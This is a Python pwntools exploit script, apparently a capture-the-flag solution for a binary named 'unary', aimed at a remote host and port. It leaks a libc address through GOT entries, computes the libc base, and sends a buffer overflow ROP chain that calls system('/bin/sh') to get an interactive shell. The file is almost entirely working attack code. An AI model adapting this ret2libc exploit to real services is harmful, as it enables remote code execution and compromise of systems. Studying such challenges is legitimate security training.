from pwn import *

env = {'LD_PRELOAD': "./libc-2.27.so"}
#s = process("./unary", env=env)
s = remote("66.172.27.144",  9004)
context.terminal = ['gnome-terminal', '-e']

#gdb.attach(s, "./unary")

# offset from ope

def addr_to_op(addr):
	return (addr - 0x600e00) / 8 + 1

# things scattered around binary

scanf_addr = 0x601030
puts_addr = 0x601018

setbuf_addr = 0x601020 # points into libc

sformat_addr = 0x400916
dformat_addr = 0x400919

poprdi_ret_addr = 0x4008d3
ret_addr = 0x4005be

# First Stage
# leaking libc base

print(s.readuntil("Operator: "))
print(str(addr_to_op(puts_addr)) + " - offset from ope to puts@got")
s.sendline(str(addr_to_op(puts_addr)))

print(s.readuntil("x = "))
print(str(setbuf_addr) + " - address of setbuf@got")
s.sendline(str(setbuf_addr))

output = s.readline().strip() + b'\x00\x00'
setbuf_real_addr = struct.unpack("P", output)[0]
print("GOT OUTPUT: " + output + " (" + str(len(output)) + " bytes)")

setbuf_offset_from_libc = 558288
libc_base_addr = setbuf_real_addr - setbuf_offset_from_libc
print("leaked libc base address: " + hex(libc_base_addr))

# offsets found in libc

system_offset_from_libc = 324672
binsh_offset_from_libc = 1785498

# Second Stage
# rop chain building

padding = "A" * 44
poprdi_ret = struct.pack("P", poprdi_ret_addr)
ret_g = struct.pack("P", ret_addr)

system_call = struct.pack("P", libc_base_addr + system_offset_from_libc)
binsh_ptr = struct.pack("P", libc_base_addr + binsh_offset_from_libc)

ROPCHAIN = padding + ret_g + poprdi_ret + binsh_ptr + system_call

# Third Stage
# sending the ropchain

print(s.readuntil("Operator: "))
print(str(addr_to_op(scanf_addr)) + " - offset from ope to scanf@got")
s.sendline(str(addr_to_op(scanf_addr)))

print(s.readuntil("x = "))
print(str(sformat_addr) + " - address of %s format")
s.sendline(str(sformat_addr))

print("SENDING THE PAYLOAD: " + ROPCHAIN)
s.sendline(ROPCHAIN)

# End
# select 0 on next loop iteration to activate
print(s.readuntil("Operator: "))
print("0 - finish last loop")
s.sendline("0")

# should get interactive shell by now

s.interactive()
